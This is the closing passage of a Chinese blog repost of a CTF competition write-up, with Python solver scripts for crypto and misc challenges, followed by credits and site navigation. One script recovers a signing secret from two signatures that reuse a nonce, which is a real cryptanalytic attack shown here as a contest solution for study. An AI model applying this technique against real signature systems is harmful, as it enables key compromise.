last</span><br><span class="line"> </span><br><span class="line">c = 1047573452</span><br><span class="line">tmp = recover(c)</span><br><span class="line">flag = rrecover(tmp)</span><br><span class="line">print(flag)</span><br><span class="line">print(&#x27;flag&#123;&#x27;+hashlib.md5(str(flag).encode()).hexdigest()+&#x27;&#125;&#x27;)</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">import gmpy2</span><br><span class="line">import hashlib</span><br><span class="line">h1,h2,s1,s2,r1,q = [818128692003030167977053277109430684611703076399,486498008062394064249282337122659834542436448201,247121551505513420409531383106944282908920522414,754913008212620944684250081707312932655139381276,1309822693949102705754289540573759976438632888627,1328243644040291196447577554903037460035141284781]</span><br><span class="line">r2 = r1</span><br><span class="line">k = (h1 * r2 - h2 * r1) * gmpy2.invert(s1 * r2 - s2 * r1,q) % q</span><br><span class="line">flag = (k * s1 - h1) * gmpy2.invert(r1,q) % q</span><br><span class="line">print(flag)</span><br><span class="line">print(long_to_bytes(flag))</span><br><span class="line">print(&#x27;flag&#123;&#x27; + hashlib.md5(str(flag).encode()).hexdigest() + &#x27;&#125;&#x27;)</span><br><span class="line">from PIL import Image</span><br><span class="line">MAX = 400</span><br><span class="line">pic = Image.new(&quot;RGB&quot;,(MAX, MAX))</span><br><span class="line">str = &#x27;000000000000000000000000000.....................0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#x27;</span><br><span class="line">i=0</span><br><span class="line">for y in range (0,MAX):</span><br><span class="line">    for x in range (0,MAX):</span><br><span class="line">        if(str[i] == &#x27;1&#x27;):</span><br><span class="line">            pic.putpixel([x,y],(0, 0, 0))</span><br><span class="line">        else:</span><br><span class="line">            pic.putpixel([x,y],(255,255,255))</span><br><span class="line">        i = i+1</span><br><span class="line">pic.show()</span><br><span class="line">pic.save(&quot;11.png&quot;)</span><br><span class="line">y = [169,178,231,186,187,120,180,187,152,171,222,58,165,156,215,149,93,219,31,160,26,50,88,254,197,99,197,46,79,38,26,65,91,191,128,141,138,189]</span><br><span class="line">x = [0xAE, 0xBF, 0xE7, 0xBC, 0xA1, 0x7A, 0xE5, 0xEA, 0x98, 0xF9, 0x8B, 0x39, 0xA5, 0x9B, 0x8E, 0x95, 0x04, 0xDE, 0x1A, 0xA2, 0x4A, 0x36, 0x0C, 0xAF, 0xC5, 0x32, 0xC2, 0x7F, 0x4A, 0x70, 0x19, 0x15, 0x58, 0xEE, 0x84, 0xDD, 0xDC, 0xA1]</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">for i in range(38):</span><br><span class="line"> flag += chr(x[i]^y[i]^ord(&#x27;a&#x27;))</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
+
+
+---
+## 附图
+
+[图片已移除]
+[图片已移除]
+[图片已移除]
+[图片已移除]
+[图片已移除]
+[图片已移除]
+[图片已移除]
+[图片已移除]
+[图片已移除]
+[图片已移除]
+
+---
+
+> **转载声明**：本文转载自 [Des-CTF-Knowledge](https://github.com/Dest1ny-Sec/Des-CTF-Knowledge)（MIT License），版权归原作者所有，转载请注明出处；如原作者不希望被转载，请联系删除。
+> 原文链接：[https://www.ctfiot.com/87116.html](https://www.ctfiot.com/87116.html)
+> 仓库原文：[CTF大赛WP集合/articles/第六届山东省大学生电子设计大赛——网络安全技能竞赛_writeup_by_M1mikatz.full.md](https://github.com/Dest1ny-Sec/Des-CTF-Knowledge/blob/main/CTF%E5%A4%A7%E8%B5%9BWP%E9%9B%86%E5%90%88/articles/%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%B1%B1%E4%B8%9C%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%94%B5%E5%AD%90%E8%AE%BE%E8%AE%A1%E5%A4%A7%E8%B5%9B%E2%80%94%E2%80%94%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B_writeup_by_M1mikatz.full.md)
+</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Web-upload/">Web-upload</a></div><div class="post_share"><div class="social-share" data-image="/img/youli.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/01/01/ctf-kb/wp/Web/%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%B1%B1%E4%B8%9C%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%94%B5%E5%AD%90%E8%AE%BE%E8%AE%A1%E5%A4%A7%E8%B5%9B-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B/" title="第六届山东省大学生电子设计大赛——网络安全技能竞赛"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">第六届山东省大学生电子设计大赛——网络安全技能竞赛</div></div></a></div><div class="next-post pull-right"><a href="/2022/01/01/ctf-kb/wp/Web/%E9%95%BF%E5%AE%89%E6%88%98%E7%96%AB-WriteUp/" title="长安战疫-WriteUp"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">长安战疫-WriteUp</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2022/01/01/ctf-kb/wp/Web/%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%B1%B1%E4%B8%9C%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%94%B5%E5%AD%90%E8%AE%BE%E8%AE%A1%E5%A4%A7%E8%B5%9B-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B/" title="第六届山东省大学生电子设计大赛——网络安全技能竞赛"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-01-01</div><div class="title">第六届山东省大学生电子设计大赛——网络安全技能竞赛</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/youli.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">朴冬</div><div class="author-info__description">琐碎的学习记录</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">1050</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">879</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">16</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://space.bilibili.com/242470829?spm_id_from=333.1007.0.0"><i class="fab fa-bilibili"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/PUDONGGGGGG" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="/2559874620@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a><a class="social-icon" href="https://space.bilibili.com/242470829?spm_id_from=333.1007.0.0" target="_blank" title="Bilibili"><i class="fab fa-bilibili" style="color: #1797cf;"></i></a></div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/Dirsearch/" title="Dirsearch">Dirsearch</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/SCRIPTS-INDEX/" title="CTF 常用脚本索引">CTF 常用脚本索引</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/ffuf%E7%9A%84%E4%BD%BF%E7%94%A8/" title="ffuf的使用">ffuf的使用</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2026 By 朴冬</div><div class="footer_custom_text">Welcome</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="chat-btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="/js/tw_cn.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div></body></html>
